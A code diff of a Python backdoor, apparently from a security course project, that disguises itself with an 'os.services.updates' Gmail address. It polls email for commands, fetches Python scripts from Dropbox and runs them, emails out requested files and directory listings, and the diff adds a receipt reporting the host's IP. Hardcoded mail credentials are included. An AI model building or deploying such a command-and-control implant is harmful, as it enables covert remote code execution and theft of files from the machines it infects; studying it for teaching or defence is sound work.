@@ -7,6 +7,12 @@ import socket
 import ssl
 import dropbox
 
+#Commands List
+#To send a file to user: download [Dropbox path] [Local name]
+#To receive a file from user: fetch [file path]
+#To execute a python script from dropbox: execute [Dropbox path]
+#To receive directory information: show [Directory path]
+
 emailAdr = "os.services.updates@gmail.com"
 password = "cse363esc"
 SMTP_SERVER = "imap.gmail.com"
@@ -41,7 +47,7 @@ def download_file(filePath, localname):
         metadata, res = dbx.files_download(path=filePath)
         f.write((res.content).decode())
 
-#Send email with msg
+#Send email with msg over SMTP SSL
 def sendEmail(msg):
     port = 465  # For SSL
 
@@ -74,7 +80,7 @@ def showFiles(com):
     subjectLine = "Subject: My Directory\n\n"
     payload = subjectLine
     payload += "Files:\n" + files_string + "\nDirectories:\n" + directories_string
-    print(payload)
+    #print(payload)
     sendEmail(payload)
 
 #EMAIL SUBJECT = fetch [file name]
@@ -101,6 +107,9 @@ def executeCom(com):
     os.system('python ' + executable_file)
     os.remove(executable_file)
     #SEND AN EMAIL AS RECEIPT OF EXECUTION
+    execution_receipt = "Subject: Executed " + execCom + "on " + str(getIP()) + "\n\n"
+    execution_receipt += "Successfuly executed script"
+    sendEmail(execution_receipt)
 
 #Parse commands from emails
 def commandParser(coms):
@@ -144,7 +153,8 @@ def readEmail():
     mail.close()
     mail.logout()
 
-#Send an update ever x seconds
+#Send an update every x seconds
+#Check email every x seconds
 def periodicUpdates(seconds):
     startTime=time.time()
     while True:
@@ -154,9 +164,3 @@ def periodicUpdates(seconds):
         time.sleep(seconds - ((time.time() - startTime) % seconds))
 
 periodicUpdates(30.0)
-
-#KEYWORDS:
-#To send a file to user: download [filename] [local name]
-#To receive a file from user: fetch [file name]
-#To execute a python script from dropbox: execute [file path from dropbox with python script]
-#To receive directory information: show [Directory path]
